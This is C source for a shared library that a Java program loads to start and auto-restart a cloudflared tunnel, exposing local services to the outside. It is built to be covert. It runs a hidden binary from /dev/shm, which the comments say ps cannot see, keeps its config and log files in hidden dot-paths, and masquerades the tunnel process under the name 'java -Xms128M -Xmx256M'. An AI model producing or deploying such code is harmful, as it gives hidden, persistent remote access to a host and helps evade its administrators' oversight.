/*
 * bot.c - Cloudflared 隧道 .so 封装
 * 
 * 编译方法:
 *   gcc -shared -fPIC -o bot.so bot.c -lpthread
 * 
 * 用法:
 *   Java JNA 加载此 .so，调用 StartCloudflared(payload)
 *   payload 格式:
 *     - 如果是 token: "eyJhIjoixxxx..."  (认证隧道)
 *     - 如果是快速隧道: "url: http://127.0.0.1:8080\nno-autoupdate: true\nprotocol: http2\n"
 * 
 * 注意: 需要 cloudflared 二进制存在于以下路径之一:
 *   - /dev/shm/.cf_real  (推荐，RAM磁盘不可见)
 *   - /tmp/.cf_real
 *   - 环境变量 CF_BIN 指定的路径
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/prctl.h>

static pid_t cf_pid = -1;
static pthread_t cf_thread;
static volatile int should_stop = 0;
static char cf_binary[512] = {0};
static char log_file[512] = {0};

/* 查找 cloudflared 二进制 */
static int find_cf_binary(void) {
    /* 1. 环境变量 */
    const char *env_bin = getenv("CF_BIN");
    if (env_bin && access(env_bin, X_OK) == 0) {
        strncpy(cf_binary, env_bin, sizeof(cf_binary) - 1);
        return 1;
    }
    
    /* 2. /dev/shm (RAM 磁盘，ps 看不到) */
    if (access("/dev/shm/.cf_real", X_OK) == 0) {
        strncpy(cf_binary, "/dev/shm/.cf_real", sizeof(cf_binary) - 1);
        return 1;
    }
    
    /* 3. /tmp */
    if (access("/tmp/.cf_real", X_OK) == 0) {
        strncpy(cf_binary, "/tmp/.cf_real", sizeof(cf_binary) - 1);
        return 1;
    }
    
    /* 4. 系统 PATH */
    if (system("which cloudflared >/dev/null 2>&1") == 0) {
        strncpy(cf_binary, "cloudflared", sizeof(cf_binary) - 1);
        return 1;
    }
    
    return 0;
}

/* 解析 payload，判断是 token 还是 config */
static int is_token(const char *payload) {
    /* token 通常是 base64 编码的长字符串，不以 "url:" 开头 */
    if (strncmp(payload, "url:", 4) == 0) return 0;
    if (strncmp(payload, "http", 4) == 0) return 0;
    if (strlen(payload) > 50) return 1;  /* 长字符串大概率是 token */
    return 0;
}

/* 写入配置文件到 /dev/shm */
static const char* write_config(const char *payload) {
    static char config_path[256];
    
    /* 优先用 /dev/shm (RAM) */
    const char *dir = access("/dev/shm", W_OK) == 0 ? "/dev/shm" : "/tmp";
    snprintf(config_path, sizeof(config_path), "%s/.cf_config_%d.yml", dir, getpid());
    
    FILE *f = fopen(config_path, "w");
    if (!f) return NULL;
    fprintf(f, "%s", payload);
    fclose(f);
    
    return config_path;
}

/* CF 运行线程 */
static void* cf_run_thread(void *arg) {
    char *payload = (char *)arg;
    
    while (!should_stop) {
        if (!find_cf_binary()) {
            fprintf(stderr, "[bot.so] cloudflared binary not found\n");
            sleep(10);
            continue;
        }
        
        pid_t pid = fork();
        if (pid == 0) {
            /* 子进程 */
            
            /* 重定向日志 */
            if (log_file[0]) {
                FILE *lf = fopen(log_file, "a");
                if (lf) {
                    dup2(fileno(lf), STDOUT_FILENO);
                    dup2(fileno(lf), STDERR_FILENO);
                    fclose(lf);
                }
            }
            
            /* 修改进程名（伪装） */
            char fake_name[64];
            snprintf(fake_name, sizeof(fake_name), "java -Xms128M -Xmx256M");
            #ifdef __linux__
            prctl(15, fake_name, 0, 0, 0);  /* PR_SET_NAME = 15 */
            #endif
            
            if (is_token(payload)) {
                /* 认证隧道: cloudflared tunnel run --protocol auto --token <token> */
                execlp(cf_binary, cf_binary,
                       "tunnel", "run",
                       "--protocol", "auto",
                       "--no-autoupdate",
                       "--token", payload,
                       (char *)NULL);
            } else {
                /* 快速隧道: 写配置文件然后运行 */
                const char *config = write_config(payload);
                if (config) {
                    execlp(cf_binary, cf_binary,
                           "tunnel", "--config", config,
                           "run",
                           (char *)NULL);
                } else {
                    /* fallback: 直接用 --url */
                    /* 从 payload 提取 url */
                    char url[256] = {0};
                    const char *p = strstr(payload, "http");
                    if (p) {
                        int i = 0;
                        while (p[i] && p[i] != '\n' && i < 255) {
                            url[i] = p[i]; i++;
                        }
                    }
                    if (url[0]) {
                        execlp(cf_binary, cf_binary,
                               "tunnel", "--url", url,
                               "--no-autoupdate",
                               "--protocol", "http2",
                               (char *)NULL);
                    }
                }
            }
            
            /* execlp 失败 */
            _exit(1);
            
        } else if (pid > 0) {
            /* 父进程 */
            cf_pid = pid;
            
            int status;
            waitpid(pid, &status, 0);
            cf_pid = -1;
            
            if (should_stop) break;
            
            /* 崩溃重启，等 5 秒 */
            fprintf(stderr, "[bot.so] cloudflared exited, restarting in 5s...\n");
            sleep(5);
        } else {
            /* fork 失败 */
            fprintf(stderr, "[bot.so] fork failed\n");
            sleep(10);
        }
    }
    
    free(payload);
    return NULL;
}

/* ============================================================
 * 导出函数
 * ============================================================ */

/*
 * 启动 cloudflared 隧道
 * payload: 隧道配置（token 或 config YAML）
 * 返回: 0=成功启动, -1=失败
 */
__attribute__((visibility("default")))
int StartCloudflared(const char *payload) {
    if (!payload || strlen(payload) == 0) {
        fprintf(stderr, "[bot.so] empty payload\n");
        return -1;
    }
    
    if (cf_pid > 0) {
        fprintf(stderr, "[bot.so] already running (pid %d)\n", cf_pid);
        return 0;
    }
    
    should_stop = 0;
    
    /* 设置日志路径 */
    const char *log_dir = access("/dev/shm", W_OK) == 0 ? "/dev/shm" : "/tmp";
    snprintf(log_file, sizeof(log_file), "%s/.cf/cf.log", log_dir);
    
    /* 确保日志目录存在 */
    char log_dir_path[256];
    snprintf(log_dir_path, sizeof(log_dir_path), "%s/.cf", log_dir);
    mkdir(log_dir_path, 0755);
    
    /* 复制 payload（线程需要自己的副本） */
    char *payload_copy = strdup(payload);
    
    /* 创建运行线程 */
    if (pthread_create(&cf_thread, NULL, cf_run_thread, payload_copy) != 0) {
        fprintf(stderr, "[bot.so] pthread_create failed\n");
        free(payload_copy);
        return -1;
    }
    pthread_detach(cf_thread);
    
    return 0;
}

/*
 * 停止 cloudflared 隧道
 * 返回: 0=成功
 */
__attribute__((visibility("default")))
int StopCloudflared(const char *unused) {
    (void)unused;
    should_stop = 1;
    
    if (cf_pid > 0) {
        kill(cf_pid, SIGTERM);
        usleep(2000000);  /* 等 2 秒 */
        if (cf_pid > 0) {
            kill(cf_pid, SIGKILL);
        }
        cf_pid = -1;
    }
    
    /* 清理临时文件 */
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/dev/shm/.cf_config_%d.yml", getpid());
    unlink(tmp);
    snprintf(tmp, sizeof(tmp), "/tmp/.cf_config_%d.yml", getpid());
    unlink(tmp);
    
    return 0;
}
